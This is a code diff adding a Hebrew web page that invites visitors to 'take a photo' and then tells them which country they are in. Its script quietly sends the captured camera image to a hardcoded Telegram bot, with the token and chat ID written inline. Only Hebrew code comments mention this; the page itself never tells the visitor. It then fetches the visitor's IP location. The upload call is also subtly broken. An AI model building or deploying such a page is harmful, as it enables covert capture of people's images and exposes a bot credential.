@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>צלם תמונה</title>
+    <style>
+        body {
+            background-image: url('1.png');
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            color: white;
+            text-align: center;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: rgba(0, 0, 0, 0.7);
+            border: none;
+            color: white;
+            border-radius: 5px;
+            margin: 20px;
+        }
+
+        #result-text {
+            font-size: 24px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        #camera-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        #camera-container video {
+            width: 100%;
+            max-width: 500px;
+            border: 2px solid #fff;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>צלם תמונה</h1>
+
+    <button id="start-button">צלם תמונה</button>
+
+    <div id="camera-container">
+        <video id="video" autoplay></video>
+        <button id="take-photo">צלם</button>
+    </div>
+
+    <div id="result-text"></div>
+
+    <script>
+        const startButton = document.getElementById('start-button');
+        const cameraContainer = document.getElementById('camera-container');
+        const video = document.getElementById('video');
+        const takePhotoButton = document.getElementById('take-photo');
+        const resultText = document.getElementById('result-text');
+
+        // פתיחת מצלמת המכשיר
+        startButton.addEventListener('click', () => {
+            startButton.style.display = 'none';
+            cameraContainer.style.display = 'block';
+            
+            // בקשה לפתיחת המצלמה
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(error => {
+                    console.error('שגיאה בהפעלת המצלמה:', error);
+                    alert('לא ניתן לפתוח את המצלמה');
+                });
+        });
+
+        // צילום התמונה ושליחתה לבוט בטלגרם
+        takePhotoButton.addEventListener('click', () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const dataUrl = canvas.toDataURL('image/png');
+
+            // כאן נשלח את התמונה לבוט בטלגרם
+            sendToTelegram(dataUrl);
+
+            // סגירת המצלמה לאחר הצילום
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+
+            // סגור את המצלמה ותחליף את הכפתור
+            cameraContainer.style.display = 'none';
+            getLocation(); // קבל את המיקום לפי ה-IP
+        });
+
+        // פונקציה לשליחת התמונה לבוט בטלגרם
+        function sendToTelegram(imageData) {
+            const token = '6796201688:AAEaRoA_O41-U24XQGIX5a4MK4lMyIjjeqg'; // הכנס את הטוקן שלך
+            const chatId = '7039130805'; // הכנס את ה-chat ID שלך
+            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+            fetch(url, {
+                method: 'POST',
+                body: new FormData({
+                    chat_id: chatId,
+                    photo: imageData
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('תמונה נשלחה לבוט:', data))
+            .catch(error => console.error('שגיאה בשליחת התמונה:', error));
+        }
+
+        // פונקציה לקבלת המיקום לפי ה-IP
+        function getLocation() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    const location = data.country;
+
+                    if (location === 'IL') {
+                        resultText.innerHTML = 'אתה מישראל!';
+                        resultText.style.color = 'green';
+                        resultText.style.fontSize = '50px';
+                    } else if (location === 'US') {
+                        resultText.innerHTML = 'אתה מארצות הברית!';
+                        resultText.style.color = 'blue';
+                        resultText.style.fontSize = '50px';
+                    } else {
+                        resultText.innerHTML = `אתה מ${location}!`;
+                        resultText.style.color = 'orange';
+                        resultText.style.fontSize = '50px';
+                    }
+                })
+                .catch(error => console.error('שגיאה בהשגת המיקום:', error));
+        }
+    </script>
+</body>
+</html>
